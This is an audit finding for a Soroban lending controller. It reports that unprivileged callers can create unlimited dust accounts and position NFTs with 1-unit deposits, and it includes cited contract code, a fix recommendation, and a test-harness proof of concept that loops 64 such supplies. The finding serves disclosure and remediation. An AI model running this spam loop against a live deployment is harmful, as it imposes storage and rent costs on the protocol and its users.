### Title
Unprivileged attacker can bloat controller and position-NFT storage with dust accounts at near-zero cost — ([File: contracts/controller/src/positions/supply.rs])

### Summary
The controller has no existential-deposit equivalent: `supply` accepts any positive amount and auto-creates a fresh account (NFT mint + persistent account metadata + supply position) per call with `account_id = 0`. A single unprivileged address can mint an unbounded number of accounts for 1 base unit of an asset each, permanently inflating persistent storage on both the controller and the position-NFT contract. The codebase's own harness already contains the exact PoC.

### Finding Description
`process_deposit` in `contracts/controller/src/positions/supply.rs` validates only that the measured transfer is positive (`AmountMustBePositive`); there is no minimum-supply floor. When `account_id == 0`, `create_account` in `contracts/controller/src/account.rs` calls `nft_mint_call` and writes `AccountMeta` plus a supply-position entry per account. Each mint writes `Owner`, `Balance`, and four enumeration entries on the NFT side at a 120-day user TTL (`contracts/position-nft/src/contract.rs`). Position limits (`PositionLimitExceeded`) bound positions *per account*, not accounts per owner, so they do not cap the attack. The test `poc_single_actor_spams_unbounded_dust_accounts` in `tests/test-harness/tests/controller/supply.rs:313-344` demonstrates one actor minting 64 accounts with 1-unit deposits each, each persisting in storage.

### Impact Explanation
This is the storage-bloat class mapped to Soroban: persistent entries accrue rent and must be bumped/restored indefinitely, and every view/operation that touches accounts pays a growing footprint cost. Unlike Substrate's reaping, nothing reclaims a dust account: cleanup only fires when the account empties via withdrawal or bad-debt socialization, and the attacker has no incentive to empty them. Funds are not directly stolen, matching a Medium severity.

### Likelihood Explanation
Cost per account is one token base unit plus transaction fees — effectively zero for sub-3-decimal or low-value assets, and still negligible for 6–7 decimal stablecoins. The path is a plain `supply(caller, 0, spoke_id, [(hub_asset, 1)])` loop, reachable by any address with no privileges, and the harness test confirms the controller accepts it today.

### Recommendation
Enforce a minimum first-supply value on account creation — e.g. reject a `supply` with `account_id == 0` (or a new supply position on an empty account) whose USD value at strict prices falls below a floor such as `BAD_DEBT_USD_THRESHOLD` ($5 WAD), or require a minimum raw amount per market decimals. Alternatively, allow account creation to remain cheap but reap empty/dust accounts automatically below a threshold.

### Proof of Concept
1. Attacker mints `N` base units of a listed asset (e.g. USDC).
2. Loop `N` times: `controller.supply(attacker, 0, 1, [(HubAssetKey{asset}, 1)])`.
3. Each call mints a new position NFT (ids 1..N), writes `AccountMeta`, and creates a supply position — confirmed by `account_exists(id) == true` for every id in `tests/test-harness/tests/controller/supply.rs:313-344`.

Relevant code: [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** contracts/controller/src/positions/supply.rs (L100-135)
```rust
pub(crate) fn process_deposit(
    env: &Env,
    caller: &Address,
    account: &mut Account,
    aggregated: &AggregatedPayments,
    cache: &mut Context,
) {
    validate_position_entry_gates(
        env,
        account,
        aggregated,
        cache,
        AccountPositionType::Deposit,
    );
    let pool_addr = cache.cached_pool_address();
    let mut entries: Vec<PoolSupplyEntry> = Vec::new(env);
    for (hub_asset, amount_in) in aggregated.iter() {
        let asset_config: AssetConfig = cache.require_spoke_asset(account.spoke_id, &hub_asset);
        let received = payments::transfer_amount_measured(
            env,
            &hub_asset.asset,
            caller,
            &pool_addr,
            amount_in,
            GenericError::AmountMustBePositive,
        );
        let position = account.get_or_create_supply_position(&hub_asset, &asset_config);
        entries.push_back(PoolSupplyEntry {
            action: make_pool_action(&position, received, hub_asset.clone()),
        });
    }

    let results = pool_supply_call(env, &pool_addr, &entries);
    for_each_leg(env, &entries, &results, |entry, result| {
        merge_supply_leg(env, account, &entry.action, &result, cache);
    });
```

**File:** contracts/controller/src/account.rs (L44-74)
```rust
pub(crate) fn create_account_with(
    env: &Env,
    owner: &Address,
    spoke_id: u32,
    mode: PositionMode,
    cache: &mut Context,
    admission: SpokeAdmission,
) -> (u64, Account) {
    assert_with_error!(env, spoke_id >= 1, SpokeError::SpokeNotFound);
    match admission {
        SpokeAdmission::ActiveOnly => {
            cache.active_spoke(spoke_id);
        }
        SpokeAdmission::AllowDeprecated => {
            let _ = cache.spoke_config(spoke_id);
        }
    }

    let nft = storage::get_position_nft(env);
    let account_id = nft_mint_call(env, &nft, owner);
    let account = Account {
        owner: owner.clone(),
        spoke_id,
        mode,
        supply_positions: Map::new(env),
        borrow_positions: Map::new(env),
    };
    storage::set_account_meta(env, account_id, &AccountMeta { spoke_id, mode });

    (account_id, account)
}
```

**File:** contracts/position-nft/src/contract.rs (L68-76)
```rust
    pub fn mint(e: &Env, to: Address) -> u32 {
        controller(e).require_auth();
        renew_instance(e);
        let token_id = Enumerable::sequential_mint(e, &to);
        // sequential_mint writes Owner/Balance at the network minimum TTL; lift
        // them to the user window so a new position does not archive early.
        extend_user_persistent_ttl(e, &to, token_id);
        token_id
    }
```

**File:** tests/test-harness/tests/controller/supply.rs (L313-344)
```rust
fn poc_single_actor_spams_unbounded_dust_accounts() {
    let mut t = LendingTest::new().with_market(usdc_preset()).build();

    let attacker = t.get_or_create_user("attacker");
    let usdc = t.resolve_market("USDC");

    const N: u64 = 64;
    usdc.token_admin.mint(&attacker, &(N as i128));
    let asset = usdc.asset.clone();

    let ctrl = t.ctrl_client();
    let mut created: u64 = 0;
    let mut last_id: u64 = 0;
    for _ in 0..N {
        let dust = vec![&t.env, (hub_asset(asset.clone()), 1i128)];
        let id = ctrl.supply(&attacker, &0u64, &1u32, &dust);
        assert!(id > 0, "1-unit deposit must be accepted (no dust floor)");

        assert!(id > last_id, "each supply(id=0) must mint a new account id");
        assert!(
            ctrl.account_exists(&id),
            "spammed account persists in storage"
        );
        last_id = id;
        created += 1;
    }

    assert_eq!(
        created, N,
        "one actor created {N} distinct accounts with dust deposits"
    );
}
```
